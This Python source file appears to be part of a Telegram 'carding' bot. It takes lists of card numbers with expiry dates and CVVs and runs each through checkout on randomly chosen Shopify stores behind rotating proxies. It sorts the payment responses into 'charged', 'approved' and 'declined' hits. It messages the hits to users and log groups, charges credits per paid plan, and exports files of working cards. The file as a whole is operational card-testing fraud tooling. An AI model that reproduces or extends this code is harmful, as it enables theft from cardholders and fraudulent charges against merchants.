    lines.append(f"𝐑𝐞𝐬𝐮𝐥𝐭 𝐓𝐲𝐩𝐞 ➠ {type_label} {type_emoji}")
    lines.append(f"𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬 ➠ {total_count}")
    lines.append(f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➠ Shopify Rnd. Charge")
    lines.append(f"𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 ➠ 𝑪𝑯𝑶𝑹 𝑷𝑨𝑳𝑻𝑨𝑵")
    lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    lines.append("")

    if total_count == 0:
        lines.append("⚠️ No cards found for this category")
    else:
        for card_data in cards_list:
            cc = card_data.get('card', 'N/A')
            response = card_data.get('response', 'N/A')
            bin_info = card_data.get('bin_info', {})
            price = card_data.get('price', 'N/A')

            scheme = bin_info.get('scheme', 'N/A')
            bank = bin_info.get('bank', 'N/A')
            country = bin_info.get('country', 'N/A')
            flag = bin_info.get('country_emoji', '')
            country_display = f"{flag} {country}" if flag else country

            if "CHARGED" in response or "ORDER_PAID" in response:
                status = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 💎"
            elif "APPROVED" in response or "INVALID_CVC" in response or "INSUFFICIENT_FUNDS" in response or "INCORRECT_ZIP" in response:
                status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
            elif any(err in response for err in ["timeout", "connection error", "max retries", "json decode", "invalid api", "Unknown Error"]):
                status = "𝐄𝐫𝐫𝐨𝐫 ⚠️"
            else:
                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"

            lines.append(f"𝐒𝐭𝐚𝐭𝐮𝐬 ➠ {status}")
            lines.append(f"𝐂𝐚𝐫𝐝 ➠ {cc}")
            lines.append(f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➠ 𝐀𝐮𝐭𝐨𝐬𝐡𝐨𝐩𝐢𝐟𝐲")
            lines.append(f"𝐏𝐫𝐢𝐜𝐞 ➠ {price} $")
            lines.append(f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➠ {response}")
            lines.append(f"𝐁𝐫𝐚𝐧𝐝 ➠ {scheme}")
            lines.append(f"𝐈𝐬𝐬𝐮𝐞𝐫 ➠ {bank}")
            lines.append(f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➠ {country_display}")
            lines.append(f"𝐔𝐬𝐞𝐫 ➠ {user_display}")
            lines.append(f"𝐃𝐞𝐯 ➠ DarkxRanger")
            lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            lines.append("")

    content = "\n".join(lines)
    file_buffer = BytesIO(content.encode('utf-8'))
    file_buffer.seek(0)

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    type_map = {"charged": "CHARGED", "live": "LIVE", "dead": "DEAD", "all": "ALL"}
    filename = f"CHORPALTAN_{type_map.get(result_type, 'ALL')}_{timestamp}.txt"

    return file_buffer, filename, total_count

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MESSAGE SENDING HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def send_hit_log_to_group(bot: Bot, response_msg, user_obj, plan_name, proxy_status_formatted, price):
    user_link = build_user_link(user_obj)
    gateway_display = html_escape(f"Shopify {price} USD")
    safe_response = html_escape(str(response_msg))
    safe_plan = html_escape(str(plan_name))

    caption = (
        f"𝗛𝗜𝗧 ➠ ᏟꮋꭺꭱƦᏽꭼꭰ <tg-emoji emoji-id=\"{CUSTOM_CHARGED_EMOJI_ID}\">💎</tg-emoji>\n"
        f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➠ <b>{gateway_display}</b>\n"
        f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➠ <b>{safe_response}</b>\n"
        f"𝗨𝘀𝗲𝗿 ➠ <b>{user_link} [{safe_plan}]</b>\n"
    )

    #reply_markup = InlineKeyboardMarkup(inline_keyboard=[
        #[InlineKeyboardButton(text="𝑪𝑯𝑶𝑹 𝑷𝑨𝑳𝑻𝑨𝑵 ", url="https://t.me/CARDXV4_BOT")]
    #])

    await send_message_safe(bot, HIT_LOG_GROUP_ID, caption, parse_mode="HTML",
                             disable_web_page_preview=True)

async def send_approved_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name):
    """Always sends the approved hit to the user's DM (private chat)."""
    bin_scheme = html_escape(str(bin_data.get("scheme", "N/A")))
    bin_bank = html_escape(str(bin_data.get("bank", "N/A")))
    bin_type = html_escape(str(bin_data.get("type", "N/A")))
    bin_level = html_escape(str(bin_data.get("brand", "N/A")))
    country_name = html_escape(str(bin_data.get("country", "N/A")))
    country_flag = bin_data.get("country_emoji", "")
    bin_country = f"{country_flag} {country_name}" if country_flag else country_name
    #gateway_display = html_escape(f"Shopify {api_price} USD")
    gateway_display = html_escape(f"𝐀𝐮𝐭𝐨𝐬𝐡𝐨𝐩𝐢𝐟𝐲")
    safe_response = html_escape(str(response_msg))
    safe_proxy = proxy_status_formatted
    gif_url = await get_anime_gif()
    user_link = build_user_link(user_obj)
    dev_link = '<a href="https://t.me/Darkxranger">DarkxRanger</a>'
    user_display = f"{user_link} <b>[{html_escape(str(plan_name))}]</b>"

    caption = (
        f"<blockquote><tg-emoji emoji-id=\"{CUSTOM_APPROVED_EMOJI_ID}\">✅</tg-emoji> 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 <tg-emoji emoji-id=\"{CUSTOM_APPROVED_EMOJI_ID}\">✅</tg-emoji></blockquote>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"{EMOJI_CARD} 𝐂𝐚𝐫𝐝 ➠ <tg-spoiler><code>{html_escape(cc_formatted)}</code></tg-spoiler>\n"
        f"{EMOJI_GATEWAY} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➠ <b>{gateway_display}</b>\n"
        f"{EMOJI_PRICE} 𝐏𝐫𝐢𝐜𝐞 ➠ <b>{api_price} $</b>\n"
        f"{EMOJI_BRAND} 𝐁𝐫𝐚𝐧𝐝 ➠ <b>{bin_scheme}</b>\n"
        f"{EMOJI_LEVEL} 𝐋𝐞𝐯𝐞𝐥 ➠ <b>{bin_level}</b>\n"
        f"{EMOJI_ISSUER} 𝐈𝐬𝐬𝐮𝐞𝐫 ➠ <b>{bin_bank}</b>\n"
        f"{EMOJI_COUNTRY} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➠ <b>{bin_country}</b>\n"
        f"{EMOJI_TYPE} 𝐓𝐲𝐩𝐞 ➠ <b>{bin_type}</b>\n"
        f"{EMOJI_RESPONSE} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➠ <b>{safe_response}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"{EMOJI_USER} 𝐔𝐬𝐞𝐫 ➠ {user_display}\n"
        f"{EMOJI_DEV} 𝐃𝐞𝐯 ➠ {dev_link}   ✧   {EMOJI_PX} 𝐏𝐱 ➠ {safe_proxy}"
    )

    #reply_markup = InlineKeyboardMarkup(inline_keyboard=[
        #[InlineKeyboardButton(text="𝑪𝑯𝑶𝑹 𝑷𝑨𝑳𝑻𝑨𝑵 ", url="https://t.me/CARDXV4_BOT")]
    #])

    # Always send to user's DM (reliable: GIF + text fallback)
    await send_hit(bot, user_obj.id, caption, gif_url)

async def send_charged_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name):
    """Always sends the charged hit to the user's DM (private chat) + extra charged group."""
    bin_scheme = html_escape(str(bin_data.get("scheme", "N/A")))
    bin_bank = html_escape(str(bin_data.get("bank", "N/A")))
    bin_type = html_escape(str(bin_data.get("type", "N/A")))
    bin_level = html_escape(str(bin_data.get("brand", "N/A")))
    country_name = html_escape(str(bin_data.get("country", "N/A")))
    country_flag = bin_data.get("country_emoji", "")
    bin_country = f"{country_name} {country_flag}" if country_flag else country_name
    #gateway_display = html_escape(f"Shopify {api_price} USD")
    gateway_display = html_escape(f"𝐀𝐮𝐭𝐨𝐬𝐡𝐨𝐩𝐢𝐟𝐲")
    safe_response = html_escape(str(response_msg))
    safe_proxy = proxy_status_formatted
    gif_url = await get_anime_gif()
    user_link = build_user_link(user_obj)
    dev_link = '<a href="https://t.me/Darkxranger">DarkxRanger</a>'
    user_display = f"{user_link} <b>[{html_escape(str(plan_name))}]</b>"

    caption = (
        f"<blockquote><tg-emoji emoji-id=\"{CUSTOM_CHARGED_EMOJI_ID}\">💎</tg-emoji> 𝐂𝐇𝐀𝐑𝐆𝐄𝐃 𝐇𝐈𝐓 <tg-emoji emoji-id=\"{CUSTOM_CHARGED_EMOJI_ID}\">💎</tg-emoji></blockquote>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"{EMOJI_CARD} 𝐂𝐚𝐫𝐝 ➠ <tg-spoiler><code>{html_escape(cc_formatted)}</code></tg-spoiler>\n"
        f"{EMOJI_GATEWAY} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➠ <b>{gateway_display}</b>\n"
        f"{EMOJI_PRICE} 𝐏𝐫𝐢𝐜𝐞 ➠ <b>{api_price} $</b>\n"
        f"{EMOJI_BRAND} 𝐁𝐫𝐚𝐧𝐝 ➠ <b>{bin_scheme}</b>\n"
        f"{EMOJI_LEVEL} 𝐋𝐞𝐯𝐞𝐥 ➠ <b>{bin_level}</b>\n"
        f"{EMOJI_ISSUER} 𝐈𝐬𝐬𝐮𝐞𝐫 ➠ <b>{bin_bank}</b>\n"
        f"{EMOJI_COUNTRY} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➠ <b>{bin_country}</b>\n"
        f"{EMOJI_TYPE} 𝐓𝐲𝐩𝐞 ➠ <b>{bin_type}</b>\n"
        f"{EMOJI_RESPONSE} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➠ <b>{safe_response}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"{EMOJI_USER} 𝐔𝐬𝐞𝐫 ➠ {user_display}\n"
        f"{EMOJI_DEV} 𝐃𝐞𝐯 ➠ {dev_link}   ✧   {EMOJI_PX} 𝐏𝐱 ➠ {safe_proxy}"
    )

    #reply_markup = InlineKeyboardMarkup(inline_keyboard=[
        #[InlineKeyboardButton(text="𝑪𝑯𝑶𝑹 𝑷𝑨𝑳𝑻𝑨𝑵 ", url="https://t.me/CARDXV4_BOT")]
    #])

    # Always send to user's DM (reliable: GIF + text fallback)
    sent = await send_hit(bot, user_obj.id, caption, gif_url)
    if sent is not None:
        try:
            await bot.pin_chat_message(chat_id=user_obj.id, message_id=sent.message_id)
        except Exception as e:
            logging.warning(f"[MSH] Could not pin charged DM: {e}")

    # Also send to extra charged group log (reliable fallback)
    await send_hit(bot, EXTRA_CHARGED_GROUP_ID, caption, gif_url)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BUTTONS & PROGRESS MESSAGE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_result_buttons(session_id: str, is_running: bool = True) -> dict:
    session = MSH_SESSIONS.get(session_id, {})

    approved_count = session.get('approved', 0)
    dead_count = session.get('dead', 0)
    charged_count = session.get('charged', 0)
    checked_count = session.get('checked', 0)

    buttons = []

    buttons.append([
        {
            "text": f"AᴘᴘƦᴏᴠᴇᴅ ({approved_count})",
            "callback_data": MshResultCallback(session_id=session_id, result_type="live").pack(),
            "style": "success",
            #"icon_custom_emoji_id": BTN_LIVE_EMOJI_ID
        },
        {
            "text": f"Dᴇᴄʟɪͷᴇᴅ ({dead_count})",
            "callback_data": MshResultCallback(session_id=session_id, result_type="dead").pack(),
            "style": "danger",
            #"icon_custom_emoji_id": BTN_DEAD_EMOJI_ID
        }
    ])

    buttons.append([
        {
            "text": f"CʜᴀƦɢᴇᴅ ({charged_count})",
            "callback_data": MshResultCallback(session_id=session_id, result_type="charged").pack(),
            "style": "primary",
            #"icon_custom_emoji_id": BTN_CHARGED_EMOJI_ID
        },
        {
            "text": f"Tᴏᴛᴀʟ ({checked_count})",
            "callback_data": MshResultCallback(session_id=session_id, result_type="all").pack(),
            "style": "primary",
            #"icon_custom_emoji_id": BTN_ALL_EMOJI_ID
        }
    ])

    if is_running:
        buttons.append([
            {
                "text": "Sᴛᴏᴘ sᴇsSɪᴏɴ",
                "callback_data": MshStopCallback(session_id=session_id).pack(),
                "style": "danger",
                #"icon_custom_emoji_id": BTN_STOP_EMOJI_ID
            }
        ])

    return {"inline_keyboard": buttons}

PROGRESS_EMOJI_ID = "5258419835922030550"   # ⏳ hourglass-ish (reuses elapsed clock ID; swap for a dedicated one)
PROGRESS_BAR_WIDTH = 10


def progress_bar(checked, total):
    """Return (bar, percent) for the sliding progress bar."""
    if not total:
        return "░" * PROGRESS_BAR_WIDTH, "0.0%"
    ratio = min(max(checked / total, 0.0), 1.0)
    filled = int(ratio * PROGRESS_BAR_WIDTH)
    bar = "█" * filled + "░" * (PROGRESS_BAR_WIDTH - filled)
    return bar, f"{ratio * 100:.1f}%"


async def update_progress_message(bot: Bot, session_id):
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return

    current_time = time.time()
    last_update = session.get('last_update_time', 0)
    is_finished = session['status'] == "𝗦𝘂𝗺𝗺𝗮𝗿𝘆"
    is_stopped = session['status'] == "𝗦𝘁𝗼𝗽𝗽𝗲𝗱"

    if not is_finished and not is_stopped and (current_time - last_update) < 1.0:
        return

    elapsed = current_time - session['start_time']
    minutes = int(elapsed // 60)
    seconds = int(elapsed % 60)
    elapsed_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"

    status_icon = "<tg-emoji emoji-id=\"5258077393884562645\">⬜️</tg-emoji>" if session['status'] == "𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴..." else ("<tg-emoji emoji-id=\"5247149163132493357\">⛔️</tg-emoji>" if session['status'] == "𝗦𝘁𝗼𝗽𝗽𝗲𝗱" else "<tg-emoji emoji-id=\"6253754970349243649\">✨</tg-emoji>")
    status_text = session['status']
    if status_text == "𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴...": status_text = f"<b>{status_text}</b>"
    elif status_text == "𝗦𝘁𝗼𝗽𝗽𝗲𝗱": status_text = f"<b>{status_text}</b>"
    elif status_text == "𝗦𝘂𝗺𝗺𝗮𝗿𝘆": status_text = f"<b>{status_text}</b>"

    proxy_manager = session.get('proxy_manager')
    proxy_info = ""
    if proxy_manager:
        stats = proxy_manager.get_stats()
        proxy_info = f"\n<b>𝐏𝐫𝐨𝐱𝐢𝐞𝐬 ➠</b> <code>{stats['active']}/{stats['total_proxies']} active</code>"

    bar, percent = progress_bar(session['checked'], session['total'])

    text = (
        f"<a href='https://t.me/Darkxranger'>✧</a> <b>𝐒𝐭𝐚𝐭𝐮𝐬   ➠</b>   {status_text} {status_icon}\n"
        f"<a href='https://t.me/Darkxranger'>✧</a> <b>𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐈𝐃 ➠</b> <code>{session_id}</code>\n"
        f"<a href='https://t.me/Darkxranger'>✧</a> <b>𝐓𝐨𝐭𝐚𝐥 ➠</b> <code>「 {session['checked']}/{session['total']} 」</code>\n"
        f"      <tg-emoji emoji-id=\"{PROGRESS_EMOJI_ID}\">⏳</tg-emoji> <b>𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬 ➠</b> <code>{bar}</code> <b>{percent}</b>\n"                        
        f"      <tg-emoji emoji-id=\"{CUSTOM_CHARGED_EMOJI_ID}\">💎</tg-emoji> <b>𝐂𝐡𝐚𝐫𝐠𝐞𝐝 ➠</b> <b>{session['charged']} </b>\n"
        f"      <tg-emoji emoji-id=\"{CUSTOM_APPROVED_EMOJI_ID}\">✅</tg-emoji> <b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ➠</b> <b>{session['approved']} </b>\n"
        f"      <tg-emoji emoji-id=\"{CUSTOM_DECLINED_EMOJI_ID}\">❌</tg-emoji> <b>𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ➠</b> <b>{session['dead']} </b>\n"
        f"<a href='https://t.me/Darkxranger'>π</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➠</b> 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐫𝐧𝐝. 𝐂𝐡𝐚𝐫𝐠𝐞\n"
        f"      <tg-emoji emoji-id=\"6255910249362885846\">⚠️</tg-emoji> <b>𝐄𝐫𝐫𝐨𝐫 ➠</b> <b>{session['errors']} </b>\n"
        f"      <tg-emoji emoji-id=\"6136275172283391020\">⭐</tg-emoji> <b>𝐑𝐞𝐜𝐡𝐞𝐜𝐤 ➠</b> <b>{session.get('recheck_recovered', 0)} recovered, {session.get('recheck_remaining', 0)} remaining</b>\n"
        f"      <tg-emoji emoji-id=\"5258419835922030550\">🕔</tg-emoji> <b>𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➠</b> <b>{elapsed_str}</b>\n"
        f"<b><tg-emoji emoji-id=\"5429495925284296642\">🚬</tg-emoji> 𝐃𝐞𝐯 ➠</b> <a href='https://t.me/Darkxranger'>DarkxRanger</a>\n"
        
    )

    if session.get('last_text') == text:
        return

    if session_id not in SESSION_LOCKS:
        SESSION_LOCKS[session_id] = asyncio.Lock()

    async with SESSION_LOCKS[session_id]:
        if session.get('last_text') == text:
            return

        is_running = session['status'] == "𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴..."
        reply_markup = get_result_buttons(session_id, is_running=is_running)

        await edit_message_safe(bot, session['chat_id'], session['msg_id'], text,
                                parse_mode="HTML", reply_markup=reply_markup,
                                disable_web_page_preview=True)
        session['last_text'] = text
        session['last_update_time'] = current_time

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SINGLE CARD PROCESSING - WITH SMART RETRY LOGIC
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, user_obj, plan_name):
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return

    if is_session_stopped(session_id):
        return

    # Whether the check was started from a group chat
    is_group = session.get('is_group', False)

    sites_list = get_sites()
    if not sites_list:
        logging.error(f"[MSH] sites.txt is empty — no sites available for session {session_id}")
        session['errors'] += 1
        return

    proxy_manager = session.get('proxy_manager')
    if not proxy_manager:
        logging.error(f"[MSH] No proxy manager found for session {session_id}")
        session['errors'] += 1
        return

    # ══════════════════════════════════════════
    # STATUS CLASSIFICATION RULES
    # ══════════════════════════════════════════

    DECLINED_RESPONSES = [
        'CARD_DECLINED', 'PROCESSING_ERROR', 'GENERIC_ERROR',
        'GENERIC_DECLINE', 'DO NOT HONOR', 'DO_NOT_HONOR',
        'UNKNOWN_ERROR', 'Processing Error',
        'PICK_UP_CARD', 'DECISION_RULE_BLOCK',
        'FRAUD_SUSPECTED', '3DS_REQUIRED',
        'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD',
        'TEST_MODE_LIVE_CARD', 'AMOUNT_TOO_SMALL',
        'INCORRECT_NUMBER', 'EXPIRED_CARD', 'DS_REQUIRED',
        'ORDER_SUBMITTED'
    ]

    result_status = "ERROR"
    response_msg = "Unknown Error"
    api_price = "0.00"
    proxy_status_formatted = f"Unknown {PROXY_DEAD_EMOJI}"
    bin_data = {}
    used_proxy = None

    MAX_RETRIES = 5   # 1 initial attempt + 4 retries
    attempt = 0
    used_sites = set()

    parts = cc_formatted.split('|')
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 2: yy = "20" + yy

    if is_session_stopped(session_id):
        return

    try:
        bin_data = await get_bin_info(cc_num[:6])
    except:
        bin_data = {}

    if is_session_stopped(session_id):
        return

    while attempt < MAX_RETRIES:
        if is_session_stopped(session_id):
            return

        attempt += 1

        proxy_result = proxy_manager.get_next_proxy()

        if not proxy_result:
            logging.error(f"[MSH] No proxies available for session {session_id}")
            session['errors'] += 1
            return

        proxy, is_rotated = proxy_result
        used_proxy = proxy

        if is_session_stopped(session_id):
            return

        available_sites = [s for s in sites_list if s not in used_sites]
        site = random.choice(available_sites) if available_sites else random.choice(sites_list)
        used_sites.add(site)

        if is_session_stopped(session_id):
            return

        try:
            success, message, url, gateway, price, currency, proxy_status_raw, http_status = await process_card_api(
                cc=cc, mes=mm, ano=yy, cvv=cvv, site=site, proxy=proxy
            )

            if is_session_stopped(session_id):
                return

            if "live" in str(proxy_status_raw).lower():
                proxy_status_formatted = PROXY_LIVE_EMOJI
            else:
                proxy_status_formatted = PROXY_DEAD_EMOJI

            api_price = price
#🟢 for live, 🔴 for dead proxy //
            proxy_manager.report_result(proxy, message, http_status)

            message_upper = message.upper()
            message_lower = message.lower()

            if "ORDER_PAID" in message_upper:
                result_status = "CHARGED"
                response_msg = message
                break

            elif "INSUFFICIENT_FUNDS" in message_upper or "INCORRECT_CVC" in message_upper or "INCORRECT_ZIP" in message_upper:
                result_status = "APPROVED"
                response_msg = message
                break

            elif any(declined.upper() in message_upper for declined in DECLINED_RESPONSES):
                result_status = "DEAD"
                response_msg = message
                break

            else:
                is_proxy_error = proxy_manager.is_real_proxy_error(message, http_status)

                if is_proxy_error:
                    if attempt == MAX_RETRIES:
                        result_status = "ERROR"
                        response_msg = f"Proxy Error: {message}"
                        break
                    else:
                        await asyncio.sleep(0.5)
                        continue

                elif any(retry_err.lower() in message_lower for retry_err in RETRY_ERRORS):
                    if attempt < MAX_RETRIES:
                        logging.info(
                            f"[MSH] Site/Step error ({message[:60]}...) - "
                            f"retrying with different site... ({attempt}/{MAX_RETRIES})"
                        )
                        await asyncio.sleep(0.3)
                        continue
                    else:
                        result_status = "ERROR"
                        response_msg = f"Site Error (retried {MAX_RETRIES}x): {message}"
                        break

                else:
                    if attempt < MAX_RETRIES:
                        logging.info(
                            f"[MSH] Unknown response ({message[:60]}...) - "
                            f"retrying with fresh site/proxy ({attempt}/{MAX_RETRIES})"
                        )
                        await asyncio.sleep(0.3)
                        continue
                    else:
                        result_status = "ERROR"
                        response_msg = message
                        break

        except asyncio.CancelledError:
            raise
        except Exception as e:
            if is_session_stopped(session_id):
                return
            proxy_manager.report_result(proxy, str(e), None)

            if attempt == MAX_RETRIES:
                result_status = "ERROR"
                response_msg = "Connection Error"
                proxy_status_formatted = f"Error {PROXY_DEAD_EMOJI}"
                break
            else:
                await asyncio.sleep(0.5)
                continue

    if is_session_stopped(session_id):
        return

    print(f"{cc_formatted} | {result_status} | {response_msg} | Proxy: {mask_proxy(used_proxy) if used_proxy else 'None'}")
    logging.info(f"[MSH] {cc_formatted} | {result_status} | {response_msg} | Proxy: {mask_proxy(used_proxy) if used_proxy else 'None'}")

    session['checked'] += 1

    card_result_data = {
        'card': cc_formatted,
        'response': response_msg,
        'bin_info': bin_data,
        'price': api_price,
        'gateway': 'Shopify',
        'timestamp': datetime.now().isoformat(),
        'proxy_used': mask_proxy(used_proxy) if used_proxy else 'N/A'
    }

    if is_session_stopped(session_id):
        return

    if result_status == "CHARGED":
        session['charged'] += 1
        session['charged_cards'].append(card_result_data)

        try:
            await asyncio.gather(
                asyncio.to_thread(update_user_stats, user_id, True),
                asyncio.to_thread(log_hit_to_mshh, user_id, user_obj.username, user_obj.first_name),
                asyncio.to_thread(deduct_credits_atomic, user_id, 2),
                return_exceptions=True,
            )
        except Exception as e:
            logging.warning(f"[MSH] stats update failed: {e}")

        if is_session_stopped(session_id):
            return

        if session.get('send_charged', True):
            try:
                await send_charged_msg_to_user(bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name)
            except Exception as e:
                logging.warning(f"[MSH] charged msg send failed: {e}")

    elif result_status == "APPROVED":
        session['approved'] += 1
        session['live_cards'].append(card_result_data)

        try:
            await asyncio.gather(
                asyncio.to_thread(update_user_stats, user_id, True),
                asyncio.to_thread(deduct_credits_atomic, user_id, 1),
                return_exceptions=True,
            )
        except Exception as e:
            logging.warning(f"[MSH] stats update failed: {e}")

        if is_session_stopped(session_id):
            return

        if session.get("send_approved", False):
            try:
                await send_approved_msg_to_user(bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name)
            except Exception as e:
                logging.warning(f"[MSH] approved msg send failed: {e}")
    elif result_status == "DEAD":
        session['dead'] += 1
        session['dead_cards'].append(card_result_data)

        try:
            await asyncio.gather(
                asyncio.to_thread(update_user_stats, user_id, False),
                asyncio.to_thread(deduct_credits_atomic, user_id, 1),
                return_exceptions=True,
            )
        except Exception as e:
            logging.warning(f"[MSH] stats update failed: {e}")
    elif result_status == "ERROR":
        session['errors'] += 1
        session['error_cards'].append(card_result_data)
        try:
            await asyncio.to_thread(update_user_stats, user_id, False)
        except Exception as e:
            logging.warning(f"[MSH] error stats update failed: {e}")

    if is_session_stopped(session_id):
        return

    if session['checked'] % 30 == 0 or session['checked'] == session['total']:
        await update_progress_message(bot, session_id)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK HANDLERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.callback_query(MshResultCallback.filter())
async def handle_result_callback(callback: types.CallbackQuery, callback_data: MshResultCallback):
    try:
        session_id = callback_data.session_id
        result_type = callback_data.result_type

        session = MSH_SESSIONS.get(session_id)

        if not session:
            await _safe_answer(callback, "⚠️ Session expired", show_alert=True)
            return

        if callback.from_user.id != session.get('user_id'):
            await _safe_answer(callback, "❌ No permission", show_alert=True)
            return

        if is_buttons_locked(session_id):
            remaining = get_remaining_lock(session_id)
            await _safe_answer(callback, f"⏳ Please wait {remaining} seconds before using buttons", show_alert=True)
            return

        count = 0
        if result_type == "charged":
            count = len(session.get('charged_cards', []))
        elif result_type == "live":
            count = len(session.get('live_cards', []))
        elif result_type == "dead":
            count = len(session.get('dead_cards', []))
        else:
            count = (
                len(session.get('charged_cards', [])) +
                len(session.get('live_cards', [])) +
                len(session.get('dead_cards', [])) +
                len(session.get('error_cards', []))
            )

        if count == 0:
            type_names = {"charged": "Charged", "live": "Live", "dead": "Dead", "all": ""}
            type_name = type_names.get(result_type, "")
            await _safe_answer(callback, f"❌ No {type_name} cards found", show_alert=True)
            return

        await _safe_answer(callback, "📦 Generating report...", show_alert=False)

        user_obj = session.get('user_obj')
        plan_name = session.get('plan_name', 'TRIAL')
        user_msg_id = session.get('user_msg_id')

        file_buffer, filename, total_count = generate_result_file(session, result_type, user_obj, plan_name)

        file_content = file_buffer.read()
        file_buffer.seek(0)

        type_emojis = {
            "charged": f'<tg-emoji emoji-id="{CUSTOM_CHARGED_EMOJI_ID}">💎</tg-emoji>',
            "live": f'<tg-emoji emoji-id="{CUSTOM_APPROVED_EMOJI_ID}">✅</tg-emoji>',
            "dead": f'<tg-emoji emoji-id="{CUSTOM_DECLINED_EMOJI_ID}">❌</tg-emoji>',
            "all": "📁"
        }
        type_labels = {"charged": "𝗖𝗛𝗔𝗥𝗚𝗘𝗗", "live": "𝗟𝗶𝘃𝗲", "dead": "𝗗𝗲𝗮𝗱", "all": "𝗔𝗹𝗹"}

        emoji = type_emojis.get(result_type, "📁")
        label = type_labels.get(result_type, "𝗔𝗹𝗹")

        caption = (
            f"𝗥𝗲𝘀𝘂𝗹𝘁 𝗧𝘆𝗽𝗲 ➠ {label} {emoji}\n"
            f"𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀 ➠ <b>{total_count}</b>\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➠ 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗠𝗮𝘀𝘀"
        )

        document = types.BufferedInputFile(file=file_content, filename=filename)

        try:
            await callback.bot.send_document(
                chat_id=callback.message.chat.id,
                document=document,
                caption=caption,
                parse_mode="HTML",
                reply_to_message_id=user_msg_id
            )
        except TelegramBadRequest as e:
            err_lower = str(e).lower()
            if "message to reply not found" in err_lower or "reply message not found" in err_lower:
                try:
                    document.seek(0)
                except Exception:
                    document = types.BufferedInputFile(file=file_content, filename=filename)
                await callback.message.answer_document(document=document, caption=caption, parse_mode="HTML")
            else:
                raise

    except Exception as e:
        logging.error(f"Error handling result callback: {e}", exc_info=True)
        try:
            await callback.message.answer(f"❌ Error: <code>{str(e)[:50]}</code>", parse_mode="HTML")
        except:
            pass

@router.callback_query(MshStopCallback.filter())
async def handle_stop_callback(callback: types.CallbackQuery, callback_data: MshStopCallback):
    try:
        session_id = callback_data.session_id

        session = MSH_SESSIONS.get(session_id)

        if not session:
            await _safe_answer(callback, "⚠️ Session expired", show_alert=True)
            return

        if callback.from_user.id != session.get('user_id'):
            await _safe_answer(callback, "❌ No permission", show_alert=True)
            return

        if session['status'] != "𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴...":
            await _safe_answer(callback, "ℹ️ Not running", show_alert=True)
            return

        session['status'] = "𝗦𝘁𝗼𝗽𝗽𝗲𝗱"

        print(f"🛑 [MSH] Stop signal sent")
        logging.info(f"🛑 [MSH] Stop signal sent")

        # Graceful stop: set the flag — workers check is_session_stopped() and
        # bail on their own (in-flight cards finish, no new cards start).
        await _safe_answer(callback, "🛑 Stopping... in-flight cards will finish", show_alert=False)

        proxy_manager = session.get('proxy_manager')
